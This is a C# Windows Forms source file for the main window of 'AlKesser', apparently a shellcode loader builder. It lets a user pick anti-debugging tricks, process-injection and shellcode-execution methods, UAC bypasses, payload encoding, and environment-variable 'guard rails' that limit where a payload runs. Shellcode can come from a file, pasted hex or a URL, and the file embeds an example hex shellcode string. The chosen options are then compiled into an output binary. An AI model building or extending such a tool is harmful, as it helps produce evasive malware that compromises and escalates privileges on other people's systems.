using ElKesser;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace AlKesser
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            

            InitializeComponent();
            Logger.Initialize(debugBox);
            Logger.Info("Initializing...");
            string header = Constants.APIHeaderFile;

            // Populate main tab components
            // Sanity check existence
            if (!System.IO.File.Exists(header))
            {
                Logger.Error($"Header file not found at path: {header}");
            }
            else
            {
                Logger.Ok("Header file located. Populating UI lists from header file...");

                void TryPopulateList(System.Windows.Forms.ListBox list, string sectionName)
                {
                    if (list == null)
                    {
                        Logger.Error($"UI control is null for list section '{sectionName}'.");
                        return;
                    }
                    try
                    {
                        HeaderListPopulator.PopulateListFromHeaderSection(list, header, sectionName);
                        Logger.Ok($"List populated for section '{sectionName}'.");
                    }
                    catch (Exception ex)
                    {
                        Logger.Error($"PopulateList failed for section '{sectionName}': {ex}");
                    }
                }

                void TryPopulateCombo(System.Windows.Forms.ComboBox combo, string sectionName)
                {
                    if (combo == null)
                    {
                        Logger.Error($"UI control is null for combo section '{sectionName}'.");
                        return;
                    }
                    try
                    {
                        HeaderListPopulator.PopulateComboFromHeaderSection(combo, header, sectionName);
                        // add an empty entry at the end
                        combo.Items.Add(string.Empty);
                        Logger.Ok($"Combo populated for section '{sectionName}'");
                    }
                    catch (Exception ex)
                    {
                        Logger.Error($"PopulateCombo failed for section '{sectionName}': {ex}");
                    }
                }

                TryPopulateList(antiDebugListBox, "ANTI-DEBUGGING");
                TryPopulateCombo(psInjComboBox, "PROCESS INJECTION");
                TryPopulateCombo(shellcodeExecutionComboBox, "SHELLCODE EXECUTION");
                TryPopulateCombo(UACBComboBox, "UAC BYPASSES");
                TryPopulateCombo(genericShellcodeComboBox, "GENERIC SHELLCODE PAYLOADS FOR TESTINGS");
                Logger.Info("Tip: For any parameter you don’t want to use, simply choose the empty entry from the list or delete its text.");
                Logger.Ok("Header lists populated successfully.");
            }
            //Populate encoding tab compoents
            ShellcodeEncodingListsPopulator.LoadAlgosIntoCombosAsync(this, bin2hexEncoder, bin2hexCompressor,bin2hexEnvelope);

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }
        public static void PasteInto(TextBox tb)
        {
            Logger.Info("Paste into called");
            if (!Clipboard.ContainsText())
            {
                Logger.Warn("Clipboard does not contain text.");

                return;
            }
            string clip = Clipboard.GetText(TextDataFormat.UnicodeText);

            if (!string.IsNullOrWhiteSpace(tb.Text))
            {
                Logger.Warn("Target TextBox already contains text. Asking user for overwrite confirmation.");
                if (MessageBox.Show("Replace existing text with clipboard contents?",
                                    "Replace text?",
                                    MessageBoxButtons.YesNo,
                                    MessageBoxIcon.Question,
                                    MessageBoxDefaultButton.Button2) != DialogResult.Yes)
                {
                    Logger.Info("User canceled text replacement.");
                    return;
                }
            }

            tb.Text = clip;
            tb.SelectionStart = tb.TextLength;
            tb.SelectionLength = 0;
            tb.Focus();
            Logger.Ok("Clipboard content pasted into Text Box.");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Logger.Info("File select clicked.");
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Select a file";
                ofd.Filter = "All files (*.*)|*.*";
                ofd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                ofd.CheckFileExists = true;
                ofd.CheckPathExists = true;
                ofd.Multiselect = false;
                ofd.RestoreDirectory = true;

                if (ofd.ShowDialog(this) == DialogResult.OK)
                {
                    shellcodeFile.Text = ofd.FileName;
                    Logger.Ok($"User selected file: {ofd.FileName}");
                }
                else
                {
                    Logger.Warn("User canceled file selection dialog.");
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {

            PasteInto(shellcodeRAW);
        }

        private void button3_Click(object sender, EventArgs e)
        {

            PasteInto(shellcodeURL);
        }

        private static void ShowShellcodeTip(IWin32Window owner)
        {
            Logger.Info("Showing shellcode tip dialog.");
            var tipText =
                "Please paste shellcode as hexadecimal byte escapes.\r\n\r\n" +
                "• Use \\x followed by exactly two hex digits per byte (0–9, A–F).\r\n" +
                "• No spaces, commas, or 0x prefixes; case-insensitive.\r\n" +
                "• Line breaks are okay; I’ll validate format before continuing.\r\n\r\n" +
                "Example:";

            var example = @"\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x50\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x50\x48\x31\xC9\x48\x89\xE2\x49\x89\xE0\x49\x83\xC0\x08\x4D\x31\xC9\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x38\x48\xB8\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xEB\xFE";

            using (var dlg = new Form())
            {
                dlg.Text = "Tip";
                dlg.FormBorderStyle = FormBorderStyle.FixedDialog;
                dlg.StartPosition = FormStartPosition.CenterParent;
                dlg.ClientSize = new Size(560, 360);
                dlg.MaximizeBox = false;
                dlg.MinimizeBox = false;
                dlg.ShowInTaskbar = false;
                dlg.BackColor = SystemColors.Window;
                dlg.Font = new Font("Segoe UI", 9f);

                var header = new Label
                {
                    AutoSize = true,
                    Text = "✨ Shellcode Input Format",
                    Font = new Font("Segoe UI Semibold", 12f),
                    Location = new Point(16, 16)
                };

                var info = new Label
                {
                    AutoSize = false,
                    Location = new Point(16, 48),
                    Size = new Size(dlg.ClientSize.Width - 32, 140),
                    Text = tipText
                };

                var exampleBox = new TextBox
                {
                    Multiline = true,
                    ReadOnly = true,
                    BorderStyle = BorderStyle.FixedSingle,
                    ScrollBars = ScrollBars.Vertical,
                    Location = new Point(16, 190),
                    Size = new Size(dlg.ClientSize.Width - 32, 120),
                    Font = new Font("Consolas", 9f),
                    Text = example
                };

                var ok = new Button
                {
                    Text = "OK",
                    DialogResult = DialogResult.OK,
                    Size = new Size(90, 30),
                    Location = new Point(dlg.ClientSize.Width - 16 - 90, dlg.ClientSize.Height - 16 - 30)
                };

                ok.FlatStyle = FlatStyle.System;

                dlg.AcceptButton = ok;

                dlg.Controls.Add(header);
                dlg.Controls.Add(info);
                dlg.Controls.Add(exampleBox);
                dlg.Controls.Add(ok);

                dlg.ShowDialog(owner);
            }
            Logger.Ok("Shellcode tip dialog closed.");
        }

        private void RAWShellcodeInfo_Click(object sender, EventArgs e)
        {
            ShowShellcodeTip(this);
        }

        private void guardRailsFormat_Click(object sender, EventArgs e)
        {
            using (var dlg = new Form())
            {
                dlg.Text = "Environment Condition Format";
                dlg.FormBorderStyle = FormBorderStyle.FixedDialog;
                dlg.StartPosition = FormStartPosition.CenterParent;
                dlg.ClientSize = new Size(560, 420);
                dlg.MaximizeBox = false;
                dlg.MinimizeBox = false;
                dlg.ShowInTaskbar = false;
                dlg.BackColor = SystemColors.Window;
                dlg.Font = new Font("Segoe UI", 9f);

                var header = new Label
                {
                    AutoSize = true,
                    Text = "✨ Environment Condition Format",
                    Font = new Font("Segoe UI Semibold", 12f),
                    Location = new Point(16, 16)
                };

                var info = new Label
                {
                    AutoSize = false,
                    Location = new Point(16, 48),
                    Size = new Size(dlg.ClientSize.Width - 32, 180),
                    Text =
                        "Enter one or more conditions that match Windows environment variables.\r\n\r\n" +
                        "• Format: NAME#operator#value\r\n" +
                        "• Operators:\r\n" +
                        "    - equals       → exact string match\r\n" +
                        "    - contains     → substring match\r\n" +
                        "    - biggerthan   → numeric comparison\r\n" +
                        "    - smallerthan  → numeric comparison\r\n" +
                        "• Multiple conditions: separated by commas, quotes optional.\r\n\r\n" +
                        "Evaluation: All listed conditions must pass."
                };

                var exampleLabel = new Label
                {
                    AutoSize = true,
                    Location = new Point(16, 250),
                    Text = "Examples:"
                };

                var exampleBox = new TextBox
                {
                    Multiline = true,
                    ReadOnly = true,
                    BorderStyle = BorderStyle.FixedSingle,
                    ScrollBars = ScrollBars.Vertical,
                    Location = new Point(16, 270),
                    Size = new Size(dlg.ClientSize.Width - 32, 100),
                    Font = new Font("Consolas", 9f),
                    Text =
                        "\"PROCESSOR_LEVEL#equals#6\", \"PATH#contains#System32\"\r\n" +
                        "NUMBER_OF_PROCESSORS#biggerthan#4, USERDOMAIN#equals#ACME\r\n" +
                        "PROCESSOR_LEVEL#smallerthan#10"
                };

                var ok = new Button
                {
                    Text = "OK",
                    DialogResult = DialogResult.OK,
                    Size = new Size(90, 30),
                    Location = new Point(dlg.ClientSize.Width - 16 - 90, dlg.ClientSize.Height - 16 - 30)
                };

                dlg.AcceptButton = ok;

                dlg.Controls.Add(header);
                dlg.Controls.Add(info);
                dlg.Controls.Add(exampleLabel);
                dlg.Controls.Add(exampleBox);
                dlg.Controls.Add(ok);

                dlg.ShowDialog(this);
            }
            Logger.Ok("Guard rails format dialog closed.");
        }
        private static IEnumerable<Control> EnumerateAllControls(Control parent)
        {
            Logger.Info($"Enumerating all controls for {parent.Name}");
            foreach (Control child in parent.Controls)
            {
                yield return child;
                foreach (var grandChild in EnumerateAllControls(child))
                    yield return grandChild;
            }
        }

        async private void submitButton_Click(object sender, EventArgs e)
        {
            Logger.Info("Compilation started");

            const string TitleValidationError = "Validation Error";
            const string MsgNoSource =
                "Please provide one shellcode source (File, RAW, URL, or Generic).";
            const string MsgMultipleSources =
                "Multiple shellcode sources provided.\r\nPlease select only one.";

            bool hasFile = !string.IsNullOrWhiteSpace(shellcodeFile.Text);
            bool hasRaw = !string.IsNullOrWhiteSpace(shellcodeRAW.Text);
            bool hasUrl = !string.IsNullOrWhiteSpace(shellcodeURL.Text);
            bool hasCombo = genericShellcodeComboBox.SelectedItem != null &&
                            !string.IsNullOrWhiteSpace(genericShellcodeComboBox.SelectedItem.ToString());

            int selectedCount = new[] { hasFile, hasRaw, hasUrl, hasCombo }.Count(x => x);

            if (selectedCount == 0)
            {
                Logger.Error("Validation failed: no shellcode source provided.");
                MessageBox.Show(MsgNoSource, TitleValidationError,
                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (selectedCount > 1)
            {
                Logger.Error("Validation failed: multiple shellcode sources provided.");
                MessageBox.Show(MsgMultipleSources, TitleValidationError,
                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            Logger.Ok("Validation passed. Collecting UI data...");
            var data = new UiData(this);

            Logger.Info("Showing collected data.");
            Compiler.ShowCollectedData(this, data);

            Logger.Info("Starting compilation process...");
            string compiledFile = await Compiler.Process(data);

            Logger.Ok("Compilation process finished.");
            Logger.Info("File in: " + compiledFile);
            DialogResult = DialogResult.OK;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label12_Click(object sender, EventArgs e)
        {

        }
    }
}
